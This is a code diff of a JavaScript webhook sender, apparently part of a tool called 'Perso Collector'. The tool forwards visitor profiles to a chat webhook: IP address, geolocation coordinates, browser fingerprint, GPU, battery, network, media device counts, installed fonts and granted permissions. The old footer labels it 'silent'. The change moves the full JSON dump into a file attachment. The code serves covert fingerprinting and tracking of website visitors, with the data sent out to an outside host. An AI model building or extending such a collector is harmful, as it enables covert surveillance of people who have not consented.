@@ -30,95 +30,83 @@ function trunc(s, n = 1024) {
   return s.length > n ? s.slice(0, n - 1) + '…' : s;
 }
 
-function chunk(str, size) {
-  const out = [];
-  for (let i = 0; i < str.length; i += size) out.push(str.slice(i, i + size));
-  return out;
-}
-
 async function sendWebhook(record) {
   if (!WEBHOOK) return;
 
   let prefs = {};
   try { prefs = JSON.parse(record.preferences || '{}'); } catch {}
 
+  // ── compact embed (max ~4000 chars total) ─────────────
   const fields = [
     { name: 'ID', value: String(record.id ?? '—'), inline: true },
-    { name: 'IP', value: trunc(record.ip || '—'), inline: true },
-    { name: 'Browser', value: trunc(record.browser || '—'), inline: true },
-    { name: 'OS', value: trunc(record.os || '—'), inline: true },
-    { name: 'Device', value: trunc(record.device || '—'), inline: true },
-    { name: 'Language', value: trunc(record.language || '—'), inline: true },
-    { name: 'Timezone', value: trunc(record.timezone || '—'), inline: true },
-    { name: 'Screen', value: trunc(record.screen || '—'), inline: true },
-    { name: 'Fingerprint', value: '`' + trunc(record.fingerprint || '—', 200) + '`' },
-    { name: 'User-Agent', value: '`' + trunc(record.user_agent || '—', 400) + '`' }
+    { name: 'IP', value: trunc(record.ip || '—', 60), inline: true },
+    { name: 'Browser', value: trunc(record.browser || '—', 80), inline: true },
+    { name: 'OS', value: trunc(record.os || '—', 80), inline: true },
+    { name: 'Device', value: trunc(record.device || '—', 80), inline: true },
+    { name: 'Language', value: trunc(record.language || '—', 40), inline: true },
+    { name: 'Timezone', value: trunc(record.timezone || '—', 60), inline: true },
+    { name: 'Screen', value: trunc(record.screen || '—', 60), inline: true },
+    { name: 'Fingerprint', value: '`' + trunc(record.fingerprint || '—', 80) + '`', inline: false }
   ];
 
   if (record.geo_lat != null && record.geo_lon != null) {
     fields.push({
       name: 'IP Geolocation',
-      value: `[${record.geo_lat}, ${record.geo_lon}] — ${record.geo_city || '?'}, ${record.geo_country || '?'}\nhttps://www.google.com/maps?q=${record.geo_lat},${record.geo_lon}`
+      value: trunc(`${record.geo_lat}, ${record.geo_lon} — ${record.geo_city || '?'}, ${record.geo_country || '?'}`, 200)
     });
   }
 
-  // High-signal summary fields extracted from prefs
-  const summary = [];
-  if (prefs.webgl?.unmasked_renderer) summary.push(`GPU: ${prefs.webgl.unmasked_renderer}`);
-  if (prefs.webgl2?.unmasked_renderer) summary.push(`GPU2: ${prefs.webgl2.unmasked_renderer}`);
-  if (prefs.hardware_concurrency) summary.push(`Cores: ${prefs.hardware_concurrency}`);
-  if (prefs.device_memory_gb) summary.push(`RAM: ${prefs.device_memory_gb}GB`);
-  if (prefs.window) summary.push(`Window: ${prefs.window.inner_width}x${prefs.window.inner_height}@${prefs.window.device_pixel_ratio}x`);
-  if (prefs.battery) summary.push(`Battery: ${Math.round((prefs.battery.level || 0) * 100)}% ${prefs.battery.charging ? '(charging)' : ''}`);
-  if (prefs.connection) summary.push(`Network: ${prefs.connection.type} ${prefs.connection.downlink}Mbps ${prefs.connection.rtt}ms`);
-  if (prefs.media_device_counts) summary.push(`Media: ${prefs.media_device_counts.audio_input}mic/${prefs.media_device_counts.video_input}cam/${prefs.media_device_counts.audio_output}out`);
-  if (prefs.fonts?.length) summary.push(`Fonts: ${prefs.fonts.length} installed`);
-  if (prefs.plugins?.length) summary.push(`Plugins: ${prefs.plugins.length}`);
+  const signals = [];
+  if (prefs.webgl?.unmasked_renderer) signals.push(`GPU: ${prefs.webgl.unmasked_renderer}`);
+  if (prefs.hardware_concurrency) signals.push(`Cores: ${prefs.hardware_concurrency}`);
+  if (prefs.device_memory_gb) signals.push(`RAM: ${prefs.device_memory_gb}GB`);
+  if (prefs.window) signals.push(`Window: ${prefs.window.inner_width}x${prefs.window.inner_height}@${prefs.window.device_pixel_ratio}x`);
+  if (prefs.battery) signals.push(`Battery: ${Math.round((prefs.battery.level || 0) * 100)}%${prefs.battery.charging ? ' charging' : ''}`);
+  if (prefs.connection) signals.push(`Net: ${prefs.connection.type || '?'} ${prefs.connection.downlink || '?'}Mbps ${prefs.connection.rtt || '?'}ms`);
+  if (prefs.media_device_counts) signals.push(`Media: ${prefs.media_device_counts.audio_input}mic/${prefs.media_device_counts.video_input}cam/${prefs.media_device_counts.audio_output}out`);
+  if (prefs.fonts?.length) signals.push(`Fonts: ${prefs.fonts.length}`);
+  if (prefs.plugins?.length) signals.push(`Plugins: ${prefs.plugins.length}`);
   if (prefs.permissions) {
     const granted = Object.entries(prefs.permissions).filter(([_, v]) => v === 'granted').map(([k]) => k);
-    if (granted.length) summary.push(`Perms granted: ${granted.join(', ')}`);
+    if (granted.length) signals.push(`Granted: ${granted.join(',')}`);
   }
-  if (prefs.features?.webp) summary.push(`WebP: yes`);
-  if (prefs.features?.avif) summary.push(`AVIF: yes`);
+  if (prefs.ua_ch?.platform) signals.push(`CH-Platform: ${prefs.ua_ch.platform}`);
 
-  if (summary.length) {
-    fields.push({ name: 'Signals', value: trunc(summary.join(' · '), 1024) });
+  if (signals.length) {
+    fields.push({ name: 'Signals', value: trunc(signals.join(' · '), 900) });
   }
 
   if (prefs.fonts?.length) {
-    fields.push({ name: 'Installed Fonts', value: '```\n' + trunc(prefs.fonts.join(', '), 1000) + '\n```' });
+    fields.push({
+      name: 'Fonts',
+      value: trunc(prefs.fonts.slice(0, 40).join(', '), 900)
+    });
   }
 
-  // Full JSON dump — chunked across multiple fields if needed (Discord: 1024/field, 25 fields, 6000/embed)
-  const fullJson = JSON.stringify(prefs, null, 2);
-  const chunks = chunk(fullJson, 1000).slice(0, 5); // max 5 fields for dump
-  chunks.forEach((ch, i) => {
-    fields.push({
-      name: chunks.length > 1 ? `Full Data (${i + 1}/${chunks.length})` : 'Full Data',
-      value: '```json\n' + ch + '\n```'
-    });
-  });
-
-  const body = {
-    username: 'Perso Collector',
-    embeds: [{
-      title: 'New Profile Collected',
-      color: 0x5b8def,
-      timestamp: new Date().toISOString(),
-      fields: fields.slice(0, 25),
-      footer: { text: 'perso-collector · silent' }
-    }]
+  const embed = {
+    title: 'New Profile Collected',
+    color: 0x5b8def,
+    timestamp: new Date().toISOString(),
+    fields: fields.slice(0, 25),
+    footer: { text: 'perso-collector · full data attached' }
   };
 
+  // ── full JSON as file attachment ──────────────────────
+  const fullJson = JSON.stringify(prefs, null, 2);
+  const filename = `profile_${record.id || Date.now()}.json`;
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify({
+    username: 'Perso Collector',
+    embeds: [embed]
+  }));
+  form.append('files[0]', new Blob([fullJson], { type: 'application/json' }), filename);
+
   try {
-    const r = await fetch(WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
+    const r = await fetch(WEBHOOK, { method: 'POST', body: form });
     if (!r.ok) {
       const txt = await r.text();
-      console.warn('[webhook] HTTP', r.status, txt.slice(0, 200));
+      console.warn('[webhook] HTTP', r.status, txt.slice(0, 300));
     }
   } catch (err) {
     console.warn('[webhook] failed:', err.message);
